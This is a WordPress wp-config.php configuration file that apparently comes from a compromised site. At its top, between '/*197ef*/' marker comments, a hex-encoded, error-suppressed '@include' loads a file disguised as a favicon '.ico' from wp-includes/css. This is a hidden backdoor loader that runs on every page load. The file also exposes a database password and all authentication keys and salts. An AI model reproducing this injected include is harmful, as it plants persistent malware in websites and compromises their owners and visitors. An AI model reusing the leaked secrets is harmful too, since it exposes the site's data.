<?php


/*197ef*/

@include "\x2fh\x6fm\x651\x2fn\x65w\x64o\x6di\x34/\x70u\x62l\x69c\x5fh\x74m\x6c/\x77p\x2di\x6ec\x6cu\x64e\x73/\x63s\x73/\x66a\x76i\x63o\x6e_\x307\x320\x36b\x2ei\x63o";

/*197ef*/
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'newdomi4_wor0755');

/** MySQL database username */
define('DB_USER', 'newdomi4_wor0755');

/** MySQL database password */
define('DB_PASSWORD', 'Bo4tG8JZ');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY', 'fnTeSEU?o?s$*e}htL;%cRR@fzAr+F+idag&!JL[G+]AbPLPMo[bU+/Pngt)WsGLwQReum/&<ym@rYv_YwRyalWDJdiZ+r@+=s>Pgfvlsro+H=oh@cPwAT/p_wpbvagQ');
define('SECURE_AUTH_KEY', '&mX<OED^EJ(yB@&Pp[Qq)Z=mhjfrQGbozoqb&?*mK%kvd@dzkyLWESnGgJR%](-a%-MFoEQwQZlQyS{{WGD&dzwR=Mmrq)nNU$kmWUu;k)<aY&sU*+-|+rPzpYBIqfcx');
define('LOGGED_IN_KEY', 'o|gp>!ISSf$VK[l{Kj)-^xx}?<HoEyPt%Y?qMSlZ)&tkEY&nuWE|ka*F<LP(gouUJ[>[m&AraiZ[&G>lOV(gSXH(R*;}on&>P_xlrZ;(A(Qg[TJ<qMg<DvZHeZpFaa!*');
define('NONCE_KEY', '-mYOL!T}iM>x{$AB@xAa!p<akPree<E*eSU]rt%mPEr%+UAcx;J_qfJ?bN}D)O>$=KIV}ysq$P_JiPE]QDu!rcWg$W?M[A{BFpAQ?jrMB]aV)YPPR<PM&VQH|$/KH*if');
define('AUTH_SALT', ')|;)iO[w{UdvN;CYqs<-m-ED;RJ[A_b(FriC--acpyYH^oPa@dGGTy|MaG+T<a>rEMpII]QHqFAfEmy|DQe}//%e|q-b-SepR(kwJqDn(mFvc]|+B)!/KYPcRET?ODZ?');
define('SECURE_AUTH_SALT', 'Y/[{dj^]}CnU_M;TTX)a-x=cOIfhZ{{<Y+DGH^YkhpmMxLXY]U=WVu*!dU<YRsep-mfEMbmyFWvGl@dg!J*E!/EUu$}WR(Ih(VL}JS{M=g(i=$eUqCsJ[fRV^MY}n%^e');
define('LOGGED_IN_SALT', ';=bos;)J[ftWBDE;)U=)%SzG[ZHm]gLJjvXNUZqxFcNLACdDWqAi*KLzs@FvfPZu@jjBTN>b&-+ZNvcmMe;Ttlia}z>&&rKtYvRPP[dv>XjhpXaR*qAZ)RimIYR=zDND');
define('NONCE_SALT', 'eqWPkjmXA|;ONm_JtMVO)@uRIui{CKz[km&y@SgpFoWFF=an%-O(>G)R^GwNYWu(eL?o<hJKhWG>tT{YIX=kA*AXQe?*]CNo)gvfnxtVn|zQC)}MUFHTKEGrZCb>VKc%');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_bwsu_';

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', '');

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
